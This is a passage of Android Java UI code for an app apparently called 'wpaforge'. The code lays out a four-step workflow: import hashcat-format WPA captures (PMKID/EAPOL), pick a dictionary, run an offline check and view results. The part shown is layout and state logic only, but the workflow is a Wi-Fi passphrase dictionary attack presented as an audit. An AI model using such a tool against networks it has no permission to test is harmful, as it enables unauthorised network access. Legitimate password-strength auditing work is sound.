            restoreList.setVisibility(open ? View.VISIBLE : View.GONE);
            restoreToggle.setText(L.s(open ? "收起详情   \u2303" : "展开详情   \u2304",
                    open ? "Collapse   \u2303" : "Expand   \u2304"));
        });
        restoreCard.addView(groupDivider(10));
        restoreCard.addView(restoreToggle);
        pageAudit.addView(restoreCard);

        // ---- 一次性渲染 ----
        refreshRestoreCard();
        renderAudit();
        renderOfflineVerdict();
        renderChannelRecords();
        renderStrengthLog();
    }


    // ---------------------------------------------------------------- 审计页渲染

    /** 全部动态区一次性刷新（状态变了就调它，不重建整个页面）。 */
    private void renderAudit() {
        renderAuditFlow();
        refreshAuditOverview();
        renderMaterialCard();
        renderDictCard();
        renderRunCard();
    }


    /** 四步状态条：一眼看出「做到哪一步、下一步是什么」。 */
    private void renderAuditFlow() {
        if (auditFlowStrip == null) return;
        auditFlowStrip.removeAllViews();
        io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.StepInfo[] steps =
                workbench.steps(lastVerdict.hasResult());
        String[] marks = {"\u2460", "\u2461", "\u2462", "\u2463"};
        for (int i = 0; i < steps.length; i++) {
            final int idx = i;
            TextView chip = new TextView(this);
            chip.setText(marks[i] + " " + shortStepName(steps[i].step));
            chip.setTextSize(AmberTheme.FS_MICRO);
            chip.setGravity(Gravity.CENTER);
            chip.setSingleLine(true);
            chip.setPadding(px(4), px(8), px(4), px(8));
            int fg, bg;
            switch (steps[i].state) {
                case DONE:    fg = AmberTheme.OK;          bg = AmberTheme.OK_BG; break;
                case READY:   fg = ON_ACCENT;              bg = ACCENT; break;
                case ACTIVE:  fg = ON_ACCENT;              bg = AmberTheme.ACCENT_MID; break;
                case BLOCKED: fg = AmberTheme.DANGER;      bg = AmberTheme.DANGER_BG; break;
                default:      fg = AmberTheme.TEXT_FAINT;  bg = AmberTheme.CARD_2; break;
            }
            chip.setTextColor(fg);
            chip.setBackground(roundBgStatic(bg, AmberTheme.RADIUS_CHIP));
            chip.setOnClickListener(v -> scrollToAuditStep(idx));
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
            if (i > 0) lp.leftMargin = px(5);
            auditFlowStrip.addView(chip, lp);
        }
    }

    /** 状态条上的短标签（只在这里用，所以不放进工作台）。 */
    private String shortStepName(io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Step s) {
        switch (s) {
            case MATERIAL: return L.s("材料", "Material");
            case DICT:     return L.s("字典", "Dictionary");
            case RUN:      return L.s("校验", "Run");
            default:       return L.s("结果", "Result");
        }
    }


    /** 点状态条跳到对应步骤卡片。 */
    private void scrollToAuditStep(int index) {
        if (index < 0 || index >= auditStepCards.length) return;
        View v = auditStepCards[index];
        if (v == null || mainScroll == null) return;
        final int y = Math.max(0, v.getTop() + pageAudit.getTop() - px(8));
        mainScroll.smoothScrollTo(0, y);
    }

    /** 审计总览：状态 / 字典 / 材料 / 最近结果 / 待处理。 */
    private void refreshAuditOverview() {
        if (auditOverviewBox == null) return;
        auditOverviewBox.removeAllViews();
        int pending = 0;
        try {
            pending = io.github.wlmosv_png.wpaforge.audit.RestoreAdmin.pendingCount();
        } catch (Throwable ignored) {
        }
        java.util.List<io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Row> rows =
                workbench.overview(lastVerdict, pending);
        for (int i = 0; i < rows.size(); i++) {
            io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Row r = rows.get(i);
            // 注意：不能给 addView 传 null 作为 LayoutParams ——
            // 这一版 Android 的 ViewGroup.addViewInner 会走
            // checkLayoutParams(null) -> generateLayoutParams(null) -> new LayoutParams(null)
            // 直接 NPE（真机实测：点审计页即闪退）。第一行用 topGap(0) 而不是 null。
            auditOverviewBox.addView(kvRowTone(r.label, r.value, toneColor(r.tone)),
                    topGap(i == 0 ? 0 : 5));
        }
    }

    private int toneColor(io.github.wlmosv_png.wpaforge.audit.AuditWorkflow.Tone t) {
        switch (t) {
            case OK:     return AmberTheme.OK;
            case WARN:   return AmberTheme.WARN;
            case DANGER: return AmberTheme.DANGER;
            case DIM:    return AmberTheme.TEXT_FAINT;
            default:     return TEXT_DIM;
        }
    }

    /** 键值行（值可带语义色）。 */
    private View kvRowTone(String k, String val, int color) {
        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        TextView kk = new TextView(this);
        kk.setText(k);
        kk.setTextSize(AmberTheme.FS_SMALL);
        kk.setTextColor(AmberTheme.TEXT_FAINT);
        kk.setMinWidth(px(76));
        row.addView(kk);
        TextView vv = new TextView(this);
        vv.setText(val);
        vv.setTextSize(AmberTheme.FS_SMALL);
        vv.setTextColor(color);
        vv.setLineSpacing(px(3), 1f);
        row.addView(vv, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        return row;
    }

    /** 状态胶囊。 */
    private TextView chipView(String text, int fg, int bg) {
        TextView t = new TextView(this);
        t.setText(text);
        t.setTextSize(AmberTheme.FS_MICRO);
        t.setTextColor(fg);
        t.setSingleLine(true);
        t.setPadding(px(8), px(4), px(8), px(4));
        t.setBackground(roundBgStatic(bg, AmberTheme.RADIUS_CHIP));
        return t;
    }

    private TextView dimLine(String s) {
        TextView t = new TextView(this);
        t.setText(s);
        t.setTextSize(AmberTheme.FS_SMALL);
        t.setTextColor(AmberTheme.TEXT_FAINT);
        t.setLineSpacing(px(4), 1f);
        return t;
    }

    // ---- ① 材料卡 ----

    /**
     * 清除当前材料。
     *
     * <p>结果卡**不跟着删** —— 它是历史记录。保留的同时由结果卡顶部的一致性徽标
     * 说明「这条结果与当前选择是什么关系」，所以留着不会造成误读。
     */
    private void clearMaterialAction() {
        workbench.clearMaterial();
        offEntries = null;
        diagOpen.clear();
        lastEntry = null;
        lastReport = null;
        renderAudit();
        Toast.makeText(this, L.s(
                        "已清除材料。下方历史结果仍在，并会标明它与当前选择的关系。",
                        "Material cleared. The history result stays below and states how it "
                                + "relates to your current selection."),
                Toast.LENGTH_LONG).show();
    }

    // ---- ② 诊断卡 ----

    /**
     * 从全部材料里选一条。
     *
     * <p>列表同样有上限（{@link #MAX_PICK_ITEMS}）—— 上万条的对话框和上万张卡片
     * 一样会把界面拖死。超出部分明确写出来，不静默截断。
     */
    private void showAllEntriesPicker() {
        java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> es = safeEntries();
        if (es.isEmpty()) return;
        int shown = Math.min(es.size(), MAX_PICK_ITEMS);
        io.github.wlmosv_png.wpaforge.ui.NetDialog pick =
                new io.github.wlmosv_png.wpaforge.ui.NetDialog(this,
                        L.f("选择材料（共 %d 条）", "Pick material (%d in total)", es.size()),
                        es.size() > shown
                                ? L.f("列表只列前 %d 条；其余请用材料文件裁剪后再导入。",
                                      "Only the first %d are listed; trim the capture and import "
                                              + "again for the rest.", shown)
                                : null);
        for (int i = 0; i < shown; i++) {
            final int idx = i;
            pick.addItem((i + 1) + ". " + es.get(i).label(), d -> selectMaterialEntry(idx));
        }
        pick.setNegative(L.s("取消", "Cancel"), null);
        pick.show();
    }

    /** 选中一条材料，并把诊断结论同步给工作台。 */
    private void selectMaterialEntry(int index) {
        java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> es = safeEntries();
        if (index < 0 || index >= es.size()) return;
        io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e = es.get(index);
        io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.Report rep =
                io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.examine(e);
        lastEntry = e;
        lastReport = rep;
        workbench.selectEntry(index, rep.executable, rep.whyNot());
        renderAudit();
    }

    // ---- ③ 字典卡 ----

    /**
     * 当前材料里可用的 SSID（优先已选中的那条）。
     *
     * <p>只接受**合法 UTF-8** 的 SSID：派生逻辑按文本做变形（大小写、数字族、字母族），
     * 而 SSID 是任意字节串 —— 把非 UTF-8（如 GBK 中文）的字节解成 String 再拿去派生，
     * 得到的是乱码产生的无意义候选（还可能是替换字符 U+FFFD），既浪费候选位，
     * 又让用户以为"派生过了"。这种材料我们宁可不提供这个入口，也不产出垃圾。
     */
    private String materialSsid() {
        if (lastEntry != null && lastEntry.ssidExact
                && lastEntry.ssid != null && !lastEntry.ssid.isEmpty()) {
            return lastEntry.ssid;
        }
        for (io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e : safeEntries()) {
            if (e.ssidExact && e.ssid != null && !e.ssid.isEmpty()) return e.ssid;
        }
        return "";
    }

    private java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> safeEntries() {
        return offEntries == null
                ? java.util.Collections
                        .<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry>emptyList()
                : offEntries;
    }

    // ---- ④ 执行卡 ----

    /**
     * 步骤 ④ 的「开始离线校验」。
     *
     * <p>条件不满足时**不静默**：直接把 {@code workbench.blocker()} 的原因弹出来，
     * 并在卡片上高亮同一句话 —— 用户不用猜「为什么按钮按不动」。
     */
    private void startOfflineRun() {
        if (offlineBusy) {
            Toast.makeText(this, L.s("正在比对，先停止或等它结束",
                    "Already running - stop it or wait"), Toast.LENGTH_SHORT).show();
            return;
        }
        String why = workbench.blocker();
        if (!why.isEmpty()) {
            Toast.makeText(this, why, Toast.LENGTH_LONG).show();
            renderAudit();
            return;
        }
        java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> es = safeEntries();
        int idx = workbench.selectedIndex();
        if (idx < 0 || idx >= es.size()) {
            Toast.makeText(this, L.s("请先在第 2 步选一条材料",
                    "Pick an entry in step 2 first"), Toast.LENGTH_LONG).show();
            return;
        }
        runOfflineOne(es.get(idx));
    }

    /**
     * 开始按钮 / 停止按钮 的可用性。
     *
     * <h3>为什么开始按钮不隐藏</h3>
     * 上一版运行时把「开始」设成 {@code GONE}，它下面的「停止」立刻上移顶到同一个
     * 位置上（只差 6dp 上边距）。用户双击「开始」时，第二下正好落在「停止」上 ——
     * 刚起来的任务被立刻取消，用户看到的是"一点开始就自己取消了"。
     * 现在开始按钮**始终占位**（运行中置灰并改文案），两个按钮位置恒定。
     */
    private void refreshOfflineButtons() {
        boolean processBusy = io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.held();
        if (auditStartBtn != null) {
            boolean can = workbench.canStart() && !processBusy;
            auditStartBtn.setVisibility(View.VISIBLE);
            auditStartBtn.setEnabled(can);
            auditStartBtn.setAlpha(can ? 1f : 0.5f);
            auditStartBtn.setText(offlineBusy
                    ? L.s("比对进行中…", "Comparing...")
                    : L.s("开始离线校验", "Run the offline check"));
        }
        if (auditStopBtn != null) {
            auditStopBtn.setVisibility(offlineBusy || processBusy ? View.VISIBLE : View.GONE);
        }
    }

    /**
     * 渲染「上次的比对没有正常结束」的痕迹。
     *
     * <p>运行状态只在内存里，进程被杀后一点痕迹都不剩 —— 重开时用户看到的是
     * **上一次**的结果卡，材料与字典碰巧一样时一致性徽标还会写"可以直接采信"，
     * 与"上次那轮被中断"完全混为一谈。开跑时落一条最小痕迹即可把两者分开。
     */
    private void renderInflight() {
        if (auditInflightBox == null) return;
        auditInflightBox.removeAllViews();
        io.github.wlmosv_png.wpaforge.audit.InflightRun inf =
                io.github.wlmosv_png.wpaforge.OfflineRunStore.loadInflight(this);
        boolean processBusy = io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.held();
        if (inf == null && !processBusy) {
            auditInflightBox.setVisibility(View.GONE);
            return;
        }
        auditInflightBox.setVisibility(View.VISIBLE);

        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setBackground(roundBgStatic(AmberTheme.WARN_BG, AmberTheme.RADIUS_CHIP));
        box.setPadding(px(13), px(11), px(13), px(11));

        TextView t = new TextView(this);
        StringBuilder sb = new StringBuilder();
        if (inf != null) {
            sb.append(L.f("\u26a0 上次的比对没有正常结束：%s 开始",
                    "\u26a0 The last comparison never finished: started %s",
                    fmtStamp(inf.startedAt)));
            if (!inf.materialName.isEmpty()) {
                sb.append(L.s(" · 材料 ", " · material ")).append(inf.materialName);
            }
            if (!inf.dictName.isEmpty()) {
                sb.append(L.s(" · 字典 ", " · dictionary ")).append(inf.dictName);
            }
            sb.append(L.s("\n很可能是应用被系统回收了。下面的结果卡是在那之前跑的那一次，"
                            + "不是这一轮的。",
                    "\nThe app was most likely reclaimed by the system. The result card below "
                            + "belongs to the run BEFORE that one."));
        }
        if (processBusy) {
            if (sb.length() > 0) sb.append('\n');
            sb.append(L.s("\u26a0 进程内仍有比对在运行（可能来自上一次会话的界面实例）。",
                    "\u26a0 A comparison is still running in this process (possibly started by a "
                            + "previous activity instance)."));
        }
        t.setText(sb.toString());
        t.setTextSize(AmberTheme.FS_SMALL);
        t.setTextColor(AmberTheme.WARN);
        t.setLineSpacing(px(4), 1f);
        box.addView(t);

        Button clear = rowActionPlain(L.s("清除这条痕迹", "Clear this marker"));
        clear.setTextColor(ACCENT);
        clear.setOnClickListener(v -> {
            io.github.wlmosv_png.wpaforge.OfflineRunStore.clearInflight(this);
            renderInflight();
            renderRunCard();
        });
        box.addView(clear);
        auditInflightBox.addView(box);
    }


    // ---------------------------------------------------------------- 运行记录

    /** 频道条 + 记录列表（一条记录一行）。 */
    private void renderChannelRecords() {
        renderChannelChips();
        if (auditRecBox == null) return;
        String empty;
        switch (logChannel) {
            case STRENGTH: empty = L.s("尚无记录。输入一个口令点「评估」。",
                    "No records yet. Type a passphrase and hit Check."); break;
            case DICT: empty = L.s("尚无记录。加载 / 生成 / 派生字典后会记在这里。",
                    "No records yet. Loading, generating or deriving a dictionary logs here."); break;
            case OTHER: empty = L.s("尚无记录。", "No records yet."); break;
            default: empty = L.s("尚无记录。导入材料跑一次，这里会按「时间 · 状态 · 对象 · 结果」记录。",
                    "No records yet. Import material and run once."); break;
        }
        renderRecords(runLog.channel(logChannel), auditRecBox, auditLogScroll, empty);
    }

    private void renderChannelChips() {
        if (auditChanStrip == null) return;
        auditChanStrip.removeAllViews();
        final io.github.wlmosv_png.wpaforge.audit.RunLog.Op[] ops = {
                io.github.wlmosv_png.wpaforge.audit.RunLog.Op.OFFLINE,
                io.github.wlmosv_png.wpaforge.audit.RunLog.Op.STRENGTH,
                io.github.wlmosv_png.wpaforge.audit.RunLog.Op.DICT,
                io.github.wlmosv_png.wpaforge.audit.RunLog.Op.OTHER
        };
        String[] names = {
                L.s("离线校验", "Offline"), L.s("口令强度", "Strength"),
                L.s("字典操作", "Dictionary"), L.s("其他", "Other")
        };
        for (int i = 0; i < ops.length; i++) {
            final io.github.wlmosv_png.wpaforge.audit.RunLog.Op op = ops[i];
            boolean on = op == logChannel;
            TextView chip = chipView(names[i] + " " + runLog.channel(op).size(),
                    on ? ON_ACCENT : AmberTheme.TEXT_DIM,
                    on ? ACCENT : AmberTheme.CARD_2);
            chip.setGravity(Gravity.CENTER);
            chip.setOnClickListener(v -> {
                logChannel = op;
                renderChannelRecords();
            });
            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f);
            if (i > 0) lp.leftMargin = px(5);
            auditChanStrip.addView(chip, lp);
        }
    }

    /**
     * 材料卡：摘要一行 + 材料列表（整行可点 = 选中并展开）。
     *
     * <p>上一版每条材料配了两条整行大按钮（「展开详情」「选这条做离线校验」），
     * 一份两条记录的文件就多出四行按钮，页面立刻散掉。现在合成一个动作：
     * **点那一行 = 选中它并且展开它的字段**；再点一次收起。
     */
    private void renderMaterialCard() {
        if (auditMatBox == null || auditDiagBox == null) return;
        auditMatBox.removeAllViews();
        auditDiagBox.removeAllViews();

        boolean imported = workbench.materialImported();
        boolean failed = !workbench.materialProblem().isEmpty();

        if (auditImportBtn != null) {
            auditImportBtn.setText(imported || failed
                    ? L.s("更换材料", "Change material")
                    : L.s("导入材料（.hc22000 / .22000）",
                          "Import material (.hc22000 / .22000)"));
        }
        if (auditClearMatBtn != null) {
            auditClearMatBtn.setVisibility(imported || failed ? View.VISIBLE : View.GONE);
        }

        if (!imported && !failed) {
            auditMatBox.addView(dimLine(L.s("还没有导入材料。",
                    "No material imported yet.")));
            return;
        }

        if (failed) {
            LinearLayout box = new LinearLayout(this);
            box.setOrientation(LinearLayout.VERTICAL);
            box.setBackground(roundBgStatic(AmberTheme.DANGER_BG, AmberTheme.RADIUS_CHIP));
            box.setPadding(px(13), px(12), px(13), px(12));
            TextView n = new TextView(this);
            n.setText(workbench.materialName().isEmpty()
                    ? L.s("(未选择文件)", "(no file)") : workbench.materialName());
            n.setTextSize(AmberTheme.FS_BODY);
            n.setTextColor(TEXT);
            box.addView(n);
            box.addView(kvRowTone(L.s("读取失败", "Read failed"),
                    workbench.materialProblem(), AmberTheme.DANGER), topGap(5));
            auditMatBox.addView(box);
            return;
        }

        // ---- 摘要：这份文件是什么、什么时候进来的 ----
        LinearLayout box = new LinearLayout(this);
        box.setOrientation(LinearLayout.VERTICAL);
        box.setBackground(roundBgStatic(AmberTheme.CARD_2, AmberTheme.RADIUS_CHIP));
        box.setPadding(px(13), px(12), px(13), px(12));

        TextView title = new TextView(this);
        title.setText(workbench.materialName());
        title.setTextSize(AmberTheme.FS_ACTION);
        title.setTextColor(TEXT);
        title.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        title.setSingleLine(true);
        title.setEllipsize(TextUtils.TruncateAt.END);
        box.addView(title);

        TextView meta = new TextView(this);
        meta.setText(workbench.materialRecords() + L.s(" 条", " entries")
                + "  \u00b7  PMKID " + workbench.materialPmkid()
                + " / EAPOL " + workbench.materialEapol()
                + "  \u00b7  " + fmtStamp(workbench.materialAt()));
        meta.setTextSize(AmberTheme.FS_SMALL);
        meta.setTextColor(AmberTheme.TEXT_DIM);
        meta.setTypeface(Typeface.MONOSPACE);
        box.addView(meta, topGap(4));

        TextView meta2 = new TextView(this);
        meta2.setText(fmtBytes(workbench.materialBytes())
                + L.s("  \u00b7  SHA-256 ", "  \u00b7  SHA-256 ")
                + shortId(workbench.materialSha256()));
        meta2.setTextSize(AmberTheme.FS_SMALL);
        meta2.setTextColor(AmberTheme.TEXT_FAINT);
        meta2.setTypeface(Typeface.MONOSPACE);
        box.addView(meta2, topGap(2));
        auditMatBox.addView(box);

        // ---- 列表：每条一行，整行可点 ----
        java.util.List<io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry> es = safeEntries();
        int drawn = Math.min(es.size(), MAX_DIAG_CARDS);
        for (int i = 0; i < drawn; i++) {
            auditDiagBox.addView(materialRow(i, es.get(i)), topGap(6));
        }
        if (es.size() > drawn) {
            auditDiagBox.addView(dimLine(L.f(
                    "共 %d 条材料，这里只画前 %d 条。离线校验用你点中的那一条。",
                    "%d entries in total; only the first %d are shown here. The check uses the "
                            + "one you tap.", es.size(), drawn)), topGap(6));
            Button more = rowAction(L.f("从全部 %d 条里选一条…",
                    "Pick from all %d entries…", es.size()));
            more.setOnClickListener(v -> showAllEntriesPicker());
            auditDiagBox.addView(more);
        }
    }

    /** 一条材料：紧凑单行（标题 / 副标题 / 状态胶囊 / 展开箭头），整行可点。 */
    private View materialRow(final int idx, io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e) {
        io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.Report rep =
                io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.examine(e);
        boolean ok = rep.executable;
        boolean unsupported = rep.status()
                == io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.Status.UNSUPPORTED;
        boolean selected = workbench.selectedIndex() == idx;
        final boolean open = diagOpen.contains(Integer.valueOf(idx));

        LinearLayout wrap = new LinearLayout(this);
        wrap.setOrientation(LinearLayout.VERTICAL);
        wrap.setBackground(roundBgStatic(selected ? AmberTheme.ACCENT_BG : AmberTheme.CARD_2,
                AmberTheme.RADIUS_CHIP));

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        row.setPadding(px(12), px(10), px(12), px(10));

        // 选中标记用一条 3dp 琥珀竖条：比整行换色更省视觉重量，也不影响可读性。
        View bar = new View(this);
        LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(px(3), px(32));
        blp.rightMargin = px(11);
        bar.setLayoutParams(blp);
        bar.setBackgroundColor(selected ? ACCENT : 0x00000000);
        row.addView(bar);

        LinearLayout col = new LinearLayout(this);
        col.setOrientation(LinearLayout.VERTICAL);
        TextView t1 = new TextView(this);
        t1.setText((idx + 1) + ". " + (e.isPmkid() ? "PMKID" : "EAPOL")
                + "  \u00b7  " + e.ssidLabel());
        t1.setTextSize(AmberTheme.FS_BODY);
        t1.setTextColor(TEXT);
        t1.setSingleLine(true);
        t1.setEllipsize(TextUtils.TruncateAt.END);
        col.addView(t1);
        TextView t2 = new TextView(this);
        t2.setText("AP " + io.github.wlmosv_png.wpaforge.audit.Hc22000.hexMac(e.apMac)
                + (ok ? "" : L.s("   \u00b7  ", "   \u00b7  ") + firstIssue(rep)));
        t2.setTextSize(AmberTheme.FS_SMALL);
        t2.setTextColor(ok ? AmberTheme.TEXT_FAINT : AmberTheme.WARN);
        t2.setSingleLine(true);
        t2.setEllipsize(TextUtils.TruncateAt.END);
        col.addView(t2, topGap(2));
        row.addView(col, new LinearLayout.LayoutParams(0,
                ViewGroup.LayoutParams.WRAP_CONTENT, 1f));
        row.addView(chipView(rep.statusLabel(),
                ok ? AmberTheme.OK : (unsupported ? AmberTheme.TEXT_FAINT : AmberTheme.WARN),
                ok ? AmberTheme.OK_BG : AmberTheme.WARN_BG));

        TextView arrow = new TextView(this);
        arrow.setText(open ? "\u2303" : "\u2304");
        arrow.setTextSize(AmberTheme.FS_TITLE);
        arrow.setTextColor(AmberTheme.TEXT_FAINT);
        arrow.setPadding(px(10), 0, 0, 0);
        row.addView(arrow);
        wrap.addView(row);

        if (open) {
            LinearLayout facts = new LinearLayout(this);
            facts.setOrientation(LinearLayout.VERTICAL);
            facts.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
            facts.setPadding(px(11), px(10), px(11), px(10));
            for (String[] f : rep.facts) {
                facts.addView(kvRowTone(f[0], f[1], TEXT_DIM), topGap(3));
            }
            for (String w : rep.warnings) {
                facts.addView(kvRowTone(L.s("警告", "Warning"), w, AmberTheme.WARN), topGap(3));
            }
            if (!rep.executable) {
                facts.addView(kvRowTone(L.s("为什么不能跑", "Blocked by"),
                        rep.whyNot(), AmberTheme.WARN), topGap(3));
            }
            LinearLayout.LayoutParams flp = new LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
            flp.leftMargin = px(12);
            flp.rightMargin = px(12);
            flp.bottomMargin = px(11);
            wrap.addView(facts, flp);
        }

        wrap.setOnClickListener(v -> onMaterialRowTap(idx));
        return wrap;
    }

    /** 第一条问题（折叠态只露一条，展开态在字段表里给全）。 */
    private static String firstIssue(io.github.wlmosv_png.wpaforge.audit.MaterialDoctor.Report r) {
        if (r.warnings != null && !r.warnings.isEmpty()) return r.warnings.get(0);
        String w = r.whyNot();
        if (w.isEmpty()) return "";
        int cut = w.indexOf('\uff1b');
        return cut > 0 ? w.substring(0, cut) : w;
    }

    /**
     * 点材料那一行：没选中就选中并展开；已选中就切换展开/收起。
     * 一个动作做完「选哪条 + 看细节」，不再要用户点两个按钮。
     */
    private void onMaterialRowTap(int idx) {
        Integer key = Integer.valueOf(idx);
        if (workbench.selectedIndex() != idx) {
            diagOpen.add(key);
            selectMaterialEntry(idx);      // 内含 renderAudit()
            return;
        }
        if (diagOpen.contains(key)) diagOpen.remove(key);
        else diagOpen.add(key);
        renderAudit();
    }

    /** 字典卡：只给「当前是哪本 + 条数 + 指纹」，操作收成三行。 */
    private void renderDictCard() {
        if (auditDictBox == null) return;
        auditDictBox.removeAllViews();
        io.github.wlmosv_png.wpaforge.audit.DictSnapshot s = workbench.dictionary();
        if (auditDictEmptyCta != null) {
            auditDictEmptyCta.removeAllViews();
        }
        if (auditChangeDictBtn != null) {
            // 一本字典都没有时，「更换字典」点进去只能看到空列表 —— 先藏起来，
            // 把位置让给「去字典管理新建 / 导入」。
            auditChangeDictBtn.setVisibility(s.empty() ? View.GONE : View.VISIBLE);
        }
        if (s.empty()) {
            if (auditDictEmptyCta != null) {
                TextView t = new TextView(this);
                t.setText(L.s("还没有字典。可以在字典管理里新建一份、从手机导入一份 txt，"
                                + "或直接加载内置字典。",
                        "No dictionary yet. Create one in dictionary management, import a .txt "
                                + "from the device, or load a built-in list."));
                t.setTextSize(AmberTheme.FS_SMALL);
                t.setTextColor(TEXT_DIM);
                t.setLineSpacing(px(4), 1f);
                t.setBackground(roundBgStatic(AmberTheme.SUNKEN, AmberTheme.RADIUS_CHIP));
                t.setPadding(px(13), px(11), px(13), px(11));
                auditDictEmptyCta.addView(t);
                Button go = AmberTheme.action(this, dp,
                        L.s("去字典管理新建 / 导入", "Open dictionary management"),
                        AmberTheme.BTN_PRIMARY);
                go.setOnClickListener(v -> openDictManager());
                auditDictEmptyCta.addView(go, topGap(8));
            }
            auditDictBox.addView(dimLine(L.s("当前字典：未选择",
                    "Current dictionary: none")));
        } else {
            TextView name = new TextView(this);
            name.setText(s.name);
            name.setTextSize(AmberTheme.FS_ACTION);
            name.setTextColor(TEXT);
            name.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
            name.setSingleLine(true);
            name.setEllipsize(TextUtils.TruncateAt.END);
            auditDictBox.addView(name);

            TextView meta = new TextView(this);
            meta.setText(s.count + L.s(" 条", " entries")
                    + "  \u00b7  " + L.s("指纹 ", "id ") + s.fingerprint()
                    + "\n" + (s.onDisk()
                            ? s.filePath + "\nSHA-256 " + s.fileId()
                            : L.s("未落盘（仅内存）", "not on disk (in memory only)")));
            meta.setTextSize(AmberTheme.FS_SMALL);
            meta.setTextColor(AmberTheme.TEXT_DIM);
            meta.setTypeface(Typeface.MONOSPACE);
            meta.setLineSpacing(px(3), 1f);
            auditDictBox.addView(meta, topGap(4));

            TextView src = new TextView(this);
            src.setText(L.s("来源 ", "source ") + auditSourceLabel(s.source)
                    + L.s("  \u00b7  快照 ", "  \u00b7  taken ") + fmtStamp(s.createdAt));
            src.setTextSize(AmberTheme.FS_SMALL);
            src.setTextColor(AmberTheme.TEXT_FAINT);
            auditDictBox.addView(src, topGap(4));
        }
        if (!dictRestoreNote.isEmpty()) {
            TextView n = new TextView(this);
            n.setText(dictRestoreNote);
            n.setTextSize(AmberTheme.FS_SMALL);
            n.setTextColor(AmberTheme.WARN);
            n.setLineSpacing(px(4), 1f);
            n.setBackground(roundBgStatic(AmberTheme.WARN_BG, AmberTheme.RADIUS_CHIP));
            n.setPadding(px(11), px(10), px(11), px(10));
            auditDictBox.addView(n, topGap(8));
        }
        if (auditDeriveMat != null) {
            String ssid = materialSsid();
            if (ssid.isEmpty()) {
                auditDeriveMat.setVisibility(View.GONE);
            } else {
                auditDeriveMat.setVisibility(View.VISIBLE);
                auditMaterialSsid = ssid;
                auditDeriveMat.setText(L.f("按材料的 SSID 派生字典（%s）   \u203a",
                        "Derive from the material's SSID (%s)   \u203a", ssid));
            }
        }
    }

    /** 执行卡：摘要两行 + 进度条 + 一句状态 + 开始/停止。 */
    private void renderRunCard() {
        if (auditRunBox == null) return;
        auditRunBox.removeAllViews();
        io.github.wlmosv_png.wpaforge.audit.Hc22000.Entry e = lastEntry;
        io.github.wlmosv_png.wpaforge.audit.DictSnapshot snap = workbench.dictionary();
        boolean picked = workbench.selectedIndex() >= 0 && e != null;

        TextView line1 = new TextView(this);
        line1.setText(L.s("材料  ", "Material  ")
                + (picked ? (e.isPmkid() ? "PMKID" : "EAPOL") + "  \u00b7  "
                        + (e.ssid == null || e.ssid.isEmpty() ? L.s("(无 SSID)", "(no SSID)")
                                                              : e.ssid)
                        : L.s("未选中", "none")));
        line1.setTextSize(AmberTheme.FS_BODY);
        line1.setTextColor(picked ? TEXT : AmberTheme.TEXT_FAINT);
        auditRunBox.addView(line1);

        TextView line2 = new TextView(this);
        line2.setText(L.s("字典  ", "Dictionary  ")
                + (snap.empty() ? L.s("未选择", "none")
                        : snap.name + "  \u00b7  " + snap.count + L.s(" 条", " entries")
                          + "  \u00b7  " + snap.fingerprint()));
        line2.setTextSize(AmberTheme.FS_BODY);
        line2.setTextColor(snap.empty() ? AmberTheme.TEXT_FAINT : TEXT);
        line2.setSingleLine(true);
        line2.setEllipsize(TextUtils.TruncateAt.END);
        auditRunBox.addView(line2, topGap(6));

        TextView line3 = new TextView(this);
        line3.setText(L.s("完整性  ", "Integrity  ") + (picked
                ? (workbench.materialExecutable() ? L.s("可执行", "runnable")
                        : L.s("不完整：", "incomplete: ") + workbench.materialExecReason())
                : L.s("\u2014", "\u2014")));
        line3.setTextSize(AmberTheme.FS_BODY);
        line3.setTextColor(!picked ? AmberTheme.TEXT_FAINT
                : (workbench.materialExecutable() ? AmberTheme.OK : AmberTheme.WARN));
        line3.setSingleLine(true);
        line3.setEllipsize(TextUtils.TruncateAt.END);
        auditRunBox.addView(line3, topGap(6));

        // 进度条只在跑的时候出现（空着一条更碍眼）
        if (auditProgress != null) {
            auditProgress.setVisibility(offlineBusy ? View.VISIBLE : View.GONE);
            if (!offlineBusy) {
                auditProgress.setProgress(0f);
                auditProgress.setText("", "");
                auditProgress.setSubText("");
            }
        }

        renderInflight();

        if (auditBlocker != null) {
            String why = workbench.blocker();
            if (why.isEmpty()
                    && io.github.wlmosv_png.wpaforge.audit.OfflineRunGuard.held()
                    && !offlineBusy) {
                // 进程里还握着运行权但本实例没在跑 —— 通常是上一次会话的实例留下的。
